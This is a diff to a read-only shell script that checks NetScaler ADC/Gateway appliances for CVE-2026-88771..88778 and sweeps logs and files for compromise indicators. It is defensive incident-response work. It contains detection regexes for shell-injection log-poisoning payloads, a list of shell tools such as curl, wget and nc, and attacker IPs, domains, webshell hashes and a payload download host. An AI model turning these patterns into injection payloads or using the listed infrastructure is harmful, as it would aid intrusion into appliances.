@@ -4,7 +4,7 @@
 # NetScaler ADC / Gateway precondition checker for CTX697096
 # (CVE-2026-88771 .. CVE-2026-88778), published 2026-09-27
 #
-# Version: 1.9 (2026-10-01)
+# Version: 1.10 (2026-10-02)
 # Author : Thomas Poppelgaard - Poppelgaard.com ApS
 # License: MIT (see LICENSE). Provided AS IS, no warranty. Read-only - makes no changes.
 #
@@ -20,6 +20,11 @@
 #                               sh ctx697096_check.sh --partition <ns.conf>
 #   Save a plain-text report (no colours) as well as showing it:
 #                               sh ctx697096_check.sh --ioc --out /var/tmp/report.txt
+#   Short summary on screen, full report saved on the appliance (for NetScaler Console
+#   configuration jobs and runs across many appliances):
+#                               sh ctx697096_check.sh --ioc --summary
+#   Look further back (or less far) for recently changed files (default 30 days):
+#                               sh ctx697096_check.sh --ioc --days 60
 #   Set the fix date by hand (optional, normally detected automatically):
 #                               sh ctx697096_check.sh --ioc --fixdate "2026-09-27 16:32"
 #   Show version:               sh ctx697096_check.sh --version
@@ -33,24 +38,30 @@
 # The precondition patterns follow CTX697096. CVE-2026-88771 applies to every
 # deployment regardless of config, so an affected build is always vulnerable.
 # The IoC sweep is based on unofficial community guidance (incl. checks adapted
-# from Manuel Winkel's NetScaler CVE checklist and triage scripts v9.17 and v9.28, deyda.net, and
+# from Manuel Winkel's NetScaler CVE checklist and triage scripts v9.17, v9.28 and v9.43, deyda.net, and
 # indicators from Gotham Technology Group's IoC check, shared with permission, and the
-# IoC collection of PitScaler.com with its original sources, and Arctic Wolf's alert pack;
+# IoC collection of PitScaler.com with its original sources, Arctic Wolf's alert pack, Unit 42, LevelBlue and TENEX;
 # thanks to Michael Shuster, Ferroque Systems, for review and feedback),
 # NOT on Citrix IoCs - a clean result does not prove the appliance was not compromised.
 # =============================================================================
 
-VERSION="1.9"
+VERSION="1.10"
+IOCDATE="2 Oct 2026"   # public indicators included up to this date
+START=$(date +%s); EXPT=""
 CONF="/nsconfig/ns.conf"
 DO_IOC=0
 PART_MODE=0
 OUTFILE=""
+SUMMARY=0
 while [ $# -gt 0 ]; do
   case "$1" in
     --ioc) DO_IOC=1 ;;
     --partition) PART_MODE=1 ;;
     --out) shift; OUTFILE="$1" ;;
     --out=*) OUTFILE="${1#--out=}" ;;
+    --summary) SUMMARY=1 ;;
+    --days) shift; CTXCHK_DAYS="$1"; export CTXCHK_DAYS ;;
+    --days=*) CTXCHK_DAYS="${1#--days=}"; export CTXCHK_DAYS ;;
     --fixdate) shift; CTXCHK_FIXDATE="$1"; export CTXCHK_FIXDATE ;;
     --fixdate=*) CTXCHK_FIXDATE="${1#--fixdate=}"; export CTXCHK_FIXDATE ;;
     --version) echo "ctx697096_check.sh $VERSION"; exit 0 ;;
@@ -60,18 +71,52 @@ while [ $# -gt 0 ]; do
   shift
 done
 
+# v1.10 --summary: full report to a file on the appliance (default /var/tmp), short summary on screen
+if [ "$SUMMARY" -eq 1 ] && [ -z "$OUTFILE" ]; then
+  OUTFILE="/var/tmp/ctx697096_$(hostname 2>/dev/null | cut -d. -f1)_$(date +%Y%m%d_%H%M).txt"
+fi
 # --out: run once more with output captured to a plain-text file, then show it
 if [ -n "$OUTFILE" ] && [ -z "$CTXCHK_CHILD" ]; then
   set --
   [ "$DO_IOC" -eq 1 ] && set -- --ioc
   [ "$PART_MODE" -eq 1 ] && set -- "$@" --partition
   set -- "$@" "$CONF"
-  CTXCHK_CHILD=1 sh "$0" "$@" > "$OUTFILE" 2>&1; RC=$?
-  cat "$OUTFILE"
+  # v1.10: progress lines go to the screen (fd 3), not into the report
+  if [ -t 2 ]; then CTXCHK_PROGRESS=1 CTXCHK_CHILD=1 sh "$0" "$@" 3>&2 > "$OUTFILE" 2>&1; RC=$?
+  else CTXCHK_CHILD=1 sh "$0" "$@" > "$OUTFILE" 2>&1; RC=$?; fi
+  [ "$SUMMARY" -eq 1 ] || cat "$OUTFILE"
   # Defang attacker text in the saved report (safe to paste into mail/Teams): on log lines and
   # decoded payloads only, ; | & ` $ < > become _ and http: becomes hxxp:. The screen shows the raw text.
   perl -i -pe 'if (/^ +\| / && (/\[(after fix|BEFORE fix)\]|^ +\| +[A-Z][a-z]{2} +\d+ \d\d:\d\d:\d\d |\[\d+\/[A-Z][a-z]{2}\/\d{4}:| -> /)) { ($p,$r)=/^( +\| )(.*)$/s; $r=~s/[;|&`\$<>]/_/g; $r=~s/http(s?):/hxxp$1:/gi; $_=$p.$r }' "$OUTFILE" 2>/dev/null
-  echo; echo "Report saved to: $OUTFILE (attacker text defanged)"
+  # One result line per appliance (easy to scan or grep across many reports). v1.10: also saved at the end of
+  # the report, so reports collected from many appliances give one line each: grep "^CTX697096 checker"
+  H=$(hostname 2>/dev/null | cut -d. -f1)
+  BLD=$(grep -m1 -oE 'Running [0-9]+\.[0-9]+-[0-9]+\.[0-9]+' "$OUTFILE" | awk '{print $2}')
+  case $RC in 2) ST=VULNERABLE ;; 3) ST=UNKNOWN ;; *) ST=FIXED ;; esac
+  if grep -q 'CVE-2026-88778 is still open' "$OUTFILE"; then ISN=OFF; elif grep -q 'Enhanced ISN Generation ENABLED' "$OUTFILE"; then ISN=ENABLED; else ISN=n/a; fi
+  if grep -q 'COMPROMISE indicators' "$OUTFILE"; then CMP=YES; else CMP=no; fi
+  TL=$(grep -m1 'Exploitation traffic for CVE' "$OUTFILE")
+  BEF=$(echo "$TL" | sed -nE 's/.* ([0-9]+) of ([0-9]+) line\(s\) BEFORE the fix.*/\1 of \2/p')
+  if [ -z "$TL" ]; then TGT=no; elif [ -n "$BEF" ]; then TGT="yes,$(echo "$BEF" | tr ' ' '_')_before_fix"
+  elif echo "$TL" | grep -q 'AFTER the fixed build'; then TGT=yes,after_fix_only; else TGT=yes; fi
+  if [ "$CMP" = YES ]; then V=COMPROMISED; elif [ $RC -eq 2 ]; then V=VULNERABLE; elif [ $RC -eq 3 ]; then V=UNKNOWN
+  elif [ -n "$BEF" ]; then V=TARGETED_BEFORE_FIX; elif [ "$ISN" = OFF ]; then V=ISN_OPEN; elif [ $RC -eq 1 ]; then V=FOLLOW_UP; else V=OK; fi
+  RT=$(sed -n 's/^Done in \([0-9hms ]*\)[.(].*/\1/p' "$OUTFILE" | head -1 | tr -d ' ')
+  RESLINE="CTX697096 checker $VERSION: host=$H build=${BLD:-?} status=$ST isn=$ISN compromise=$CMP targeted=$TGT verdict=$V runtime=${RT:-?}"
+  echo "$RESLINE" >> "$OUTFILE"
+  if [ "$SUMMARY" -eq 1 ]; then
+    # the result line, then the red findings and the verdict
+    echo "$RESLINE"
+    # Red lines, plus the items listed under a COMPROMISE finding
+    awk '/^  \[(SUSPECT|AFFECTED)\]/{print substr($0,1,170); c=0} /COMPROMISE indicators/{c=1; next} c && /^ +\| /{ if (/Do NOT reboot/) {c=0; next} if (++n<=10) print substr($0,1,170)}' "$OUTFILE"
+    NCHK=$(grep -c '^  \[CHECK\]' "$OUTFILE")
+    [ "${NCHK:-0}" -gt 0 ] && echo "  $NCHK [CHECK] item(s) to review in the full report:" && grep '^  \[CHECK\]' "$OUTFILE" | cut -c14-120 | head -6 | sed 's/^/    - /'
+    grep -m1 '^VERDICT' "$OUTFILE"
+    echo "Full report on this appliance: $OUTFILE (attacker text defanged)"
+  else
+    echo "$RESLINE"
+    echo; echo "Report saved to: $OUTFILE (attacker text defanged)"
+  fi
   exit $RC
 fi
 
@@ -100,6 +145,14 @@ pre()  {
     printf '  %s[AFFECTED]%s %s\n' "$R" "$N" "$1"
   fi
 }
+# v1.10: progress lines while the IoC sweep runs, so a long run is not taken for a hang. Screen only (stderr/fd 3):
+# never in the report, and off when nothing is watching (e.g. a NetScaler Console job).
+PROG=0
+if [ "$CTXCHK_PROGRESS" = 1 ]; then PROG=1
+elif [ -z "$CTXCHK_CHILD" ] && [ "$PART_MODE" -eq 0 ] && [ -t 2 ]; then exec 3>&2; PROG=1; fi
+prog() { [ "$PROG" -eq 1 ] || return 0; _e=$(( $(date +%s) - START ))
+  printf '%s  ... %-66s %d:%02d%s\n' "$C" "$1" $((_e / 60)) $((_e % 60)) "$N" >&3; }
+fmtdur() { if [ "$1" -lt 60 ]; then echo "${1}s"; elif [ "$1" -lt 3600 ]; then echo "$(($1 / 60))m $(($1 % 60))s"; else echo "$(($1 / 3600))h $((($1 % 3600) / 60))m"; fi; }
 show() { perl -pe 's/[\x00-\x08\x0b-\x1f\x7f]/./g' 2>/dev/null | awk -v n="${1:-5}" 'NR<=n{print "             | " $0} END{if(NR>n) print "             | ... and " NR-n " more"}'; }
 note() { echo "             | $1"; }
 
@@ -163,6 +216,16 @@ $(printf '%s\n' "$2" | bfirst | head -"$_n" | binsafe)"
 binsafe() {
   perl -ne 'chomp; $b = s/[^\t\x20-\x7e]/./g; $_ = substr($_,0,240); $_ .= "  (line contains binary data)" if $b; print "$_\n"' 2>/dev/null
 }
+# v1.10: hash many files with ONE sha256 process (one process per file was slow on FreeBSD).
+# Reads file names on stdin, prints "<sha256> <path>".
+hashfiles() {
+  if command -v sha256 >/dev/null 2>&1; then xargs sha256 -r 2>/dev/null
+  else xargs sha256sum 2>/dev/null | awk '{h=$1; sub(/^[^ ]+ +\*?/,""); print h" "$0}'; fi
+}
+# Print the paths whose hash is in the list given as $1
+hashmatch() { awk -v L=" $1 " 'index(L, " " $1 " ") {sub(/^[^ ]+ /,""); print}'; }
+# v1.10: print logs, unpacking rotated .gz files - one read of the logs feeds several checks
+catlogs() { for _f in "$@"; do [ -f "$_f" ] || continue; case "$_f" in *.gz) gzip -dc "$_f" ;; *) cat "$_f" ;; esac; done 2>/dev/null; }
 cg() { grep -iE -e "$1" "$CONF"; }
 cgq() { grep -iqE -e "$1" "$CONF"; }
 
@@ -399,6 +462,23 @@ if [ "$DO_IOC" -eq 1 ]; then
   else
     NOW=$(date +%s)
     BOOT=$(boottime)
+    # v1.10: how far back the "files changed recently" checks look (--days, default 30 = whole campaign so far)
+    WINDAYS=$(echo "${CTXCHK_DAYS:-30}" | tr -cd '0-9'); [ -n "$WINDAYS" ] && [ "$WINDAYS" -ge 1 ] || WINDAYS=30
+    # v1.10: say how much log data will be searched, so a long run on a busy appliance is not taken for a hang
+    # v1.10: pre-scan estimate (idea: Deyda v9.49). Rotated .gz logs are counted at ~8x their size, because they
+    # are unpacked to be searched. Range from test runs; storage speed and appliance load change the real time.
+    EST=$(ls -lnL /var/log/httpaccess* /var/log/httperror* /var/log/ns.log* /var/log/messages* /var/log/notice.log* /var/log/nsvpn.log* /var/log/sh.log* /var/log/bash.log* 2>/dev/null \
+          | awk '$1 ~ /^-/ {n++; b+=$5; e+= ($NF ~ /\.gz$/) ? $5*8 : $5} END {printf "%d %d %d", n, int((b+1048575)/1048576), int((e+1048575)/1048576)}')
+    set -- $EST; LOGN=${1:-0}; LOGMB=${2:-0}; LOGEFF=${3:-0}; set --
+    ESTLO=$((5 + LOGEFF * 60 / 1000)); ESTHI=$((20 + LOGEFF * 250 / 1000))
+    EXPT="$(fmtdur $ESTLO)-$(fmtdur $ESTHI)"
+    echo "  Read-only: nothing on the appliance is changed and nothing is sent anywhere (--out/--summary only save the report)."
+    echo "  Searching $LOGN log file(s): $LOGMB MB on disk, about $LOGEFF MB unpacked."
+    echo "  Expected: $EXPT on a typical VPX, longer on a busy appliance."
+    # with --out/--summary the report goes to a file, so show the same on screen
+    if [ "$CTXCHK_PROGRESS" = 1 ]; then
+      prog "Read-only. $LOGN log file(s), $LOGMB MB on disk. Expected: $EXPT"
+    fi
 
     # --- Context: firmware install, last boot, log retention -------------------
     # v1.8: when did the fixed build start running? installns copies the kernel to /flash as
@@ -485,6 +565,7 @@ if [ "$DO_IOC" -eq 1 ]; then
     done
 
     # --- File checks ---------------------------------------------------------
+    prog "[1/6] Files: web folders, temp folders, known hashes"
     # Dot-files dropped under LogonPoint/custom
     # v1.7: all web-served folders (Gotham), minus the one stock file
     DOTS=$(find /var/netscaler/logon /netscaler/ns_gui /var/netscaler/gui /var/vpn /netscaler/portal \
@@ -494,12 +575,12 @@ if [ "$DO_IOC" -eq 1 ]; then
     # .dot files under LogonPoint/custom (Deyda triage script)
     DOTF=$(find /var/netscaler/logon/LogonPoint/custom -name '*.dot' -type f 2>/dev/null)
     [ -n "$DOTF" ] && { warn ".dot files under LogonPoint/custom - check when and why they were created:"; echo "$DOTF" | show 10; FOLLOWUP=1; }
-    # Recently modified web-served files (last 14 days), grouped by modification time.
+    # Recently modified web-served files (last $WINDAYS days, --days), grouped by modification time.
     # Many files written in one burst (>= 20 files, <= 30s apart) = system/theme
     # rewrite (expected); a handful of files on their own = review.
     WEBDIRS="${CTXCHK_WEBDIRS:-/var/netscaler/logon /netscaler/ns_gui /var/vpn}"
     RECENT=$(find $WEBDIRS 2>/dev/null \
-             -type f \( -name '*.php' -o -name '*.xml' -o -name '*.js' -o -name '*.html' \) -mtime -14 2>/dev/null)
+             -type f \( -name '*.php' -o -name '*.xml' -o -name '*.js' -o -name '*.html' \) -mtime -$WINDAYS 2>/dev/null)
     if [ -n "$RECENT" ]; then
       # Cluster all web-file mtimes: a gap of <= 30s keeps files in the same
       # cluster, so a rewrite that takes several seconds counts as one event.
@@ -513,13 +594,22 @@ if [ "$DO_IOC" -eq 1 ]; then
                   st=i }
               } }')
       RWGRP=""; LONE=""
-      for f in $RECENT; do
-        m=$(mtime "$f"); CL=$(echo "$CLMAP" | awk -v m="$m" '$1==m{print $2, $3; exit}')
-        cs=${CL% *}; cn=${CL#* }; [ -n "$CL" ] || cn=0
-        if [ "$cn" -ge 20 ]; then RWGRP="$RWGRP
+      if command -v perl >/dev/null 2>&1; then
+        # v1.10: one perl process for all files (was a perl + awk per file: most of the run time on FreeBSD)
+        RES=$(printf '%s\n' "$RECENT" | CLMAP="$CLMAP" perl -ne '
+          BEGIN { for (split /\n/, $ENV{CLMAP}) { my ($m,$s,$n)=split; $cl{$m}="$s $n" if defined $n } }
+          chomp; next unless length; my @st=stat($_); my $c=(@st && exists $cl{$st[9]}) ? $cl{$st[9]} : "";
+          my ($s,$n)=split / /, $c; if ($c ne "" && $n >= 20) { print "G $s $n\n" } else { print "L $_\n" }')
+        RWGRP=$(printf '%s\n' "$RES" | sed -n 's/^G //p'); LONE=$(printf '%s\n' "$RES" | sed -n 's/^L //p')
+      else
+        for f in $RECENT; do
+          m=$(mtime "$f"); CL=$(echo "$CLMAP" | awk -v m="$m" '$1==m{print $2, $3; exit}')
+          cs=${CL% *}; cn=${CL#* }; [ -n "$CL" ] || cn=0
+          if [ "$cn" -ge 20 ]; then RWGRP="$RWGRP
 $cs $cn"; else LONE="$LONE
 $f"; fi
-      done
+        done
+      fi
       echo "$RWGRP" | grep -v '^$' | sort -u | while read -r m n; do
         AT=""; [ -n "$BOOT" ] && [ "$m" -ge "$((BOOT - 60))" ] && [ "$m" -le "$((BOOT + 900))" ] && AT=" at boot"
         okay "$n web files rewritten together$AT on $(fmtdate "$m") - whole theme/system rewrite (expected)"
@@ -614,7 +704,7 @@ $line" ;;
         fi
       fi
     else
-      okay "No web files modified in the last 14 days"
+      okay "No web files modified in the last $WINDAYS days"
     fi
     # httpd.conf changes - expected right after a boot (NetScaler rebuilds /etc)
     HTTPDCHG=0
@@ -643,6 +733,7 @@ $line" ;;
                     || okay "No recent core/crash files"
 
     # --- Persistence / process checks (adapted from deyda.net checklist) -----
+    prog "[2/6] Persistence: cron, startup files, processes"
     NOBODYCRON=$(crontab -l -u nobody 2>/dev/null | grep -v '^#')
     [ -n "$NOBODYCRON" ] && { warn "Crontab entries for user 'nobody' (persistence?):"; echo "$NOBODYCRON" | show 10; FOLLOWUP=1; } \
                          || okay "No crontab for user 'nobody'"
@@ -651,6 +742,7 @@ $line" ;;
                        || okay "No unexpected 'nobody' processes"
 
     # --- Log checks ------------------------------------------------------------
+    prog "[3/6] Logs: HTTP errors, VPN clients, login-page injection"
     B64=$(grep -liE 'b64decode|base64_decode' /var/log/httperror.log* /var/log/httpaccess.log* 2>/dev/null)
     [ -n "$B64" ] && { warn "b64decode strings found in HTTP logs:"; echo "$B64" | show; FOLLOWUP=1; } \
                   || okay "No b64decode strings in HTTP logs"
@@ -665,7 +757,8 @@ $line" ;;
     if [ -n "$NONRCV" ]; then
       NTOT=$(echo "$NONRCV" | wc -l | tr -d ' ')
       # drop normal Gateway logon-page traffic, keep the rest for review
-      ODD=$(echo "$NONRCV" | sed -nE 's/.*"(GET|POST|HEAD|PUT|OPTIONS) ([^ ?"]*).*/\2/p' \
+      # v1.10: perl instead of sed - FreeBSD sed took ~2 ms per line on this pattern (7.8 s for 4,300 lines)
+      ODD=$(echo "$NONRCV" | { perl -ne 'print "$2\n" if /.*"(GET|POST|HEAD|PUT|OPTIONS) ([^ ?"]*)/' 2>/dev/null || sed -nE 's/.*"(GET|POST|HEAD|PUT|OPTIONS) ([^ ?"]*).*/\2/p'; } \
             | grep -vE '^/(vpn/(index|tmindex|logout|tmlogout)\.html|vpn/(login|resources|nsshare|nsutil|nscookie|pluginlist)\.js|logon/|vpn/(js|images|resources|media|scripts)/|vpn/pluginlist|cgi/(login|logout|setclient|GetAuthMethods)|vpn/init|p/u/|menu/|nf/auth|epa/|vpns/j_services\.html|favicon\.ico|robots\.txt)|^\*$' \
             | sort | uniq -c | sort -rn | head -10)
       SRCS=$(echo "$NONRCV" | awk '{print $1}' | sort | uniq -c | sort -rn | head -5)
@@ -686,33 +779,33 @@ $line" ;;
     # CVE-2026-88771 technique (public, watchTowr 2026-09-28): shell metacharacters in
     # logon-related log entries (username, User-Agent, parameters)
     CMDS='sh|bash|csh|tcsh|curl|wget|fetch|tftp|ftp|nc|ncat|python[0-9.]*|perl|php|id|uname|echo|cat|chmod|chown|rm|mv|cp|base64|openssl|mkfifo|kill|touch'
-    INJ=$( { zgrep -ah -iE 'user|login|logon|agent|aaa' /var/log/ns.log* 2>/dev/null \
+    INJ=$( { zgrep -ah -iE 'user|login|logon|agent|aaa' /var/log/ns.log* /var/log/nsvpn.log* 2>/dev/null \
              | grep -E "\`|\\\$\\(|[|;&][[:space:]]*($CMDS)([[:space:]<>;|&\`]|\\\$|\$)"
            # obfuscation seen in the wild (Lupovis, 2026-09-28): \${IFS} instead of spaces,
            # fake pitboss messages as the login name: "...unexpectedly died NSPPE;<cmd>;# X" (Lupovis,
            # watchTowr PoC) and "...missed too many heartbeatsNSPPE;<cmd>" (CERT-EU). ns_monuploadd_err.pl
            # also reads /var/log/messages, so that is searched too.
-           zgrep -ah -E 'died[[:space:]]+NSPPE(-[0-9]+)?[[:space:]]*(;|%3B)|missed too many heartbeats[^"]*(;|%3B)|authenticate user :?[[:space:]]*pitboss|\$\{?IFS\}?|%24%7BIFS%7D|pitboss.*(IFS|b64decode|base64|(;|%3B)[[:space:]]*(sh|bash|curl|wget|fetch|tftp|nc|python|perl|php))|(%3B|%7C)(sh|bash|curl|wget|fetch|tftp|nc|python|perl|php)' /var/log/ns.log* /var/log/messages* 2>/dev/null
+           zgrep -ah -E 'died[[:space:]]+NSPPE(-[0-9]+)?[[:space:]]*(;|%3B)|missed too many heartbeats[^"]*(;|%3B)|authenticate user :?[[:space:]]*pitboss|\$\{?IFS\}?|%24%7BIFS%7D|pitboss.*(IFS|b64decode|base64|(;|%3B)[[:space:]]*(sh|bash|curl|wget|fetch|tftp|nc|python|perl|php))|(%3B|%7C)(sh|bash|curl|wget|fetch|tftp|nc|python|perl|php)' /var/log/ns.log* /var/log/messages* /var/log/notice.log* /var/log/nsvpn.log* 2>/dev/null
            # v1.9 (Elastic rule "Potential NetScaler Log Poisoning Command Injection Attempt"): any pitboss
            # packet-engine message with a shell metacharacter, also URL-encoded - catches hand-written variants
            # without a known command name after it
-           zgrep -ahiE 'pitboss.*(nsppe|ppe|packet.*engine|core)' /var/log/ns.log* /var/log/messages* 2>/dev/null \
+           zgrep -ahiF 'pitboss' /var/log/ns.log* /var/log/messages* /var/log/notice.log* /var/log/nsvpn.log* 2>/dev/null | grep -aiE 'pitboss.*(nsppe|ppe|packet.*engine|core)' \
              | grep -aiE ';|`|\$\(|&&|\|\||%3b|%60|%7c|%24%28|%26%26|%3e|%3c'
          } | grep -v 'shell_command=' | sort -u | fixtag "$( [ "$VULN_BUILD" = "no" ] && echo "$FIXT")" | bfirst)
     if [ -n "$INJ" ]; then
       N_ALL=$(echo "$INJ" | grep -c .); N_AFT=$(echo "$INJ" | grep -c '^\[after fix\]'); N_BEF=$(echo "$INJ" | grep -c '^\[BEFORE fix\]')
       if [ "$VULN_BUILD" = "no" ] && [ -n "$FIXT" ] && [ "$N_ALL" -eq "$N_AFT" ]; then
-        warn "ns.log entries with shell injection patterns - all $N_ALL AFTER the fixed build started running ($(fmtdate "$FIXT")):"
+        warn "ns.log / nsvpn.log entries with shell injection patterns - all $N_ALL AFTER the fixed build started running ($(fmtdate "$FIXT")):"
         echo "$INJ" | show 10
         note "Attempts after the fix cannot run commands on this build - still being targeted, not compromised."
       else
-        susp "ns.log entries with shell injection patterns ($N_ALL line(s)$( [ "$N_BEF" -gt 0 ] && echo ", $N_BEF BEFORE the fix - shown first")) - CVE-2026-88771 exploitation attempts, check whether they succeeded:"
+        susp "ns.log / nsvpn.log entries with shell injection patterns ($N_ALL line(s)$( [ "$N_BEF" -gt 0 ] && echo ", $N_BEF BEFORE the fix - shown first")) - CVE-2026-88771 exploitation attempts, check whether they succeeded:"
         echo "$INJ" | show 10
         note "[BEFORE fix] lines (or undated lines) may have run: the command is picked up by a background job, up to ~24h later."
       fi
       FOLLOWUP=1
     else
-      okay "No shell metacharacters in logon-related ns.log entries"
+      okay "No shell metacharacters in logon-related ns.log / nsvpn.log entries"
     fi
     # v1.7 "ARMED" (Gotham): on a vulnerable build, injected text still sitting in the files the daily
     # ns_monuploadd_err.pl check reads next (ns.log, ns.log.0, messages) runs at its next run.
@@ -720,7 +813,12 @@ $line" ;;
       ARMED=0; ARMF=""
       for f in /var/log/ns.log /var/log/ns.log.0 /var/log/messages; do
         [ -f "$f" ] || continue
-        n=$(grep -aE 'died[[:space:]]+NSPPE(-[0-9]+)?[[:space:]]*(;|%3B)|missed too many heartbeats[^"]*(;|%3B)' "$f" 2>/dev/null | grep -vc 'shell_command=')
+        # v1.10: also the vulnerable script's OWN pattern (pitboss.*PPE.*unexpectedly died / missed too many heartbeats,
+        # any case) plus a shell character - so "pitboss NSPPE-00;<cmd>;# unexpectedly died" (command BEFORE the
+        # words, craigsblackie root-cause PoC) is flagged too. Up to v1.10 beta only "...died NSPPE;<cmd>" was.
+        n=$( { grep -aE 'died[[:space:]]+NSPPE(-[0-9]+)?[[:space:]]*(;|%3B)|missed too many heartbeats[^"]*(;|%3B)' "$f" 2>/dev/null
+               grep -aiE 'pitboss.*PPE.*(unexpectedly died|missed too many heartbeats)' "$f" 2>/dev/null | grep -aE ';|`|\$\(|&&|\|\||%3[bB]|%60'; } \
+             | grep -v 'shell_command=' | sort -u | grep -c .)
         [ "${n:-0}" -gt 0 ] && { ARMED=$((ARMED + n)); ARMF="$ARMF $f ($n)"; }
       done
       if [ "$ARMED" -gt 0 ]; then
@@ -746,11 +844,16 @@ $line" ;;
     GN_IPS="$GN_IPS 45.141.21.130 89.44.80.7 130.94.42.226 134.175.71.50 177.4.12.11"
     # + Unit 42 (30 Sep). Its two Cloudflare WARP addresses (104.28.x) are left out - shared by ordinary users.
     GN_IPS="$GN_IPS 45.61.136.143 66.227.183.84 162.33.178.9 193.149.176.207 216.245.184.164"
+    # + TENEX (30 Sep): Platypus C2 nodes, and the gsocket / netcat opportunistic wave
+    GN_IPS="$GN_IPS 195.123.233.245 38.180.81.157 95.133.231.109 104.200.67.56 199.233.217.13 130.94.20.222"
+    # + Sygnia (30 Sep) and the original LevelBlue SpiderLabs blog (30 Sep). 87.224.84.82 moved here from the
+    #   scanner group: LevelBlue saw it exploiting.
+    GN_IPS="$GN_IPS 45.76.34.141 209.250.236.77 138.68.21.29 170.64.176.26 70.172.58.168 162.243.36.88 173.40.135.209 47.230.224.154 87.224.84.82"
     GN_IPRE=$(echo "$GN_IPS" | sed -e 's/\./\\./g' -e 's/ /|/g')
-    GN_DOM='echvista\.com|entretiensol\.com'
+    GN_DOM='echvista\.com|entretiensol\.com|white-guard\.pro|gsocket\.io|garyvard\.com|hickoryusedauto\.com|gurerasfalt\.com|rockinroyaltykids\.com|currydownsrvpark\.com'
     # Opportunistic scanners tagged by GreyNoise after the public PoC (via PitScaler.com): hunting leads only.
     # Cloudflare WARP egress addresses (104.28.x) are left out - they are shared by ordinary users.
-    OPP_IPRE='172\.247\.44\.85|165\.227\.201\.112|173\.231\.39\.244|64\.225\.103\.14|159\.65\.104\.231|142\.93\.205\.229|182\.101\.54\.57|87\.224\.84\.82|137\.220\.53\.135|120\.28\.233\.211|149\.28\.58\.71|23\.234\.111\.22|198\.13\.159\.233|85\.221\.203\.85|46\.150\.68\.55|159\.26\.103\.184|45\.249\.89\.172|197\.52\.9\.138|180\.242\.113\.168|85\.117\.117\.248|73\.43\.85\.7|88\.180\.103\.22|194\.28\.195\.90|95\.63\.246\.50|31\.13\.192\.160|185\.170\.55\.89|104\.203\.50\.26|37\.19\.221\.171|45\.143\.167\.96|206\.232\.71\.215|130\.94\.106\.141|58\.187\.56\.89|171\.106\.10\.118|82\.24\.212\.15|178\.66\.43\.241|185\.209\.15\.246|94\.190\.77\.195|93\.177\.60\.233|68\.46\.140\.222|178\.218\.40\.232|49\.36\.107\.103|191\.37\.30\.194|23\.234\.74\.48|72\.73\.231\.73|95\.229\.84\.239|113\.137\.102\.68|47\.243\.125\.255|47\.76\.92\.109|8\.217\.173\.25|8\.210\.67\.91|47\.239\.205\.29|47\.76\.132\.65|8\.218\.219\.56|47\.76\.102\.1|47\.76\.63\.52|8\.210\.119\.74|64\.177\.93\.71|44\.252\.255\.141|194\.242\.130\.193|125\.122\.56\.47|23\.132\.164\.35|54\.70\.59\.128|44\.226\.128\.41|4\.246\.63\.96|176\.65\.148\.54'
+    OPP_IPRE='172\.247\.44\.85|165\.227\.201\.112|173\.231\.39\.244|64\.225\.103\.14|159\.65\.104\.231|142\.93\.205\.229|182\.101\.54\.57|137\.220\.53\.135|120\.28\.233\.211|149\.28\.58\.71|23\.234\.111\.22|198\.13\.159\.233|85\.221\.203\.85|46\.150\.68\.55|159\.26\.103\.184|45\.249\.89\.172|197\.52\.9\.138|180\.242\.113\.168|85\.117\.117\.248|73\.43\.85\.7|88\.180\.103\.22|194\.28\.195\.90|95\.63\.246\.50|31\.13\.192\.160|185\.170\.55\.89|104\.203\.50\.26|37\.19\.221\.171|45\.143\.167\.96|206\.232\.71\.215|130\.94\.106\.141|58\.187\.56\.89|171\.106\.10\.118|82\.24\.212\.15|178\.66\.43\.241|185\.209\.15\.246|94\.190\.77\.195|93\.177\.60\.233|68\.46\.140\.222|178\.218\.40\.232|49\.36\.107\.103|191\.37\.30\.194|23\.234\.74\.48|72\.73\.231\.73|95\.229\.84\.239|113\.137\.102\.68|47\.243\.125\.255|47\.76\.92\.109|8\.217\.173\.25|8\.210\.67\.91|47\.239\.205\.29|47\.76\.132\.65|8\.218\.219\.56|47\.76\.102\.1|47\.76\.63\.52|8\.210\.119\.74|64\.177\.93\.71|44\.252\.255\.141|194\.242\.130\.193|125\.122\.56\.47|23\.132\.164\.35|54\.70\.59\.128|44\.226\.128\.41|4\.246\.63\.96|176\.65\.148\.54'
     COMP=""; TGT=""; ALLTGT=""
     # .ctxs.receiver webshell (created 24 Sep 06:52 UTC on seen boxes; HA file sync copies it to the peer)
     F=$(find /var/netscaler/logon /netscaler/ns_gui /var/vpn -name '.ctxs*' 2>/dev/null)
@@ -763,17 +866,17 @@ webshell file: $F"
     AW_HASHES="73b74309f4728d169cc9edfb2767c5aadd75d39b62de93c935a86c777d2646bc 9c7bf01d2c2cb31a3609d27c1bc9abc60d86e37b7f9908547e0c75fb18b99aab 57f9f30c50240fd48d761de7961a430cdebf2c084a36bc76d376a1ce8e6dfa9d 974b69782fdf5d67b97cfd508465939e44ee10798dbcc1e82b92d78776bad938 927c7fbef2e620c1ce482c3ed67ebf53da97693c1d6c7552c77aec84ba982cf8"
     # + v1.9 via Deyda triage script v9.28 (Unit 42 update, 30 Sep): webshell / package / payload samples
     DY_HASHES="ae22ef2517b5c0fb47f78745b9cb5260acee0e751b89bcd354640ff8bc8d29ec 1bd314b661396c7086f6367fbbb48025e03ca2de69c073d53a8b0a38aa5fbb7d 79c65fa04541032e251fa4796b97800374b63c7982593dd1a2e0db605d429186"
-    WS_HASHES="$WS_HASHES $AW_HASHES $DY_HASHES"
-    for f in $(find /var/netscaler/logon/LogonPoint/custom /var/vpn /var/netscaler/gui/vpn/scripts /var/netscaler/gui/vpns/scripts /netscaler/ns_gui/vpn/scripts /netscaler/ns_gui/vpn/media -type f -size -2000k 2>/dev/null); do
-      h=$(sha256 -q "$f" 2>/dev/null || sha256sum "$f" 2>/dev/null | awk '{print $1}')
-      case " $WS_HASHES " in *" $h "*) [ -n "$h" ] && COMP="$COMP
-known webshell/payload SHA-256: $f" ;; esac
+    # + v1.10 LevelBlue SpiderLabs: main.py (downloaded from 23.27.143.20:9000, saved as /var/1.py)
+    LB_HASHES="e9fe43968c6c0955300e3bc4d7fb0b05a18570b4733aaf4f5c6f7f09be5a242c"
+    WS_HASHES="$WS_HASHES $AW_HASHES $DY_HASHES $LB_HASHES"
+    for f in $(find /var/netscaler/logon/LogonPoint/custom /var/vpn /var/netscaler/gui/vpn/scripts /var/netscaler/gui/vpns/scripts /netscaler/ns_gui/vpn/scripts /netscaler/ns_gui/vpn/media -type f -size -2000k 2>/dev/null | hashfiles | hashmatch "$WS_HASHES"); do
+      COMP="$COMP
+known webshell/payload SHA-256: $f"
     done
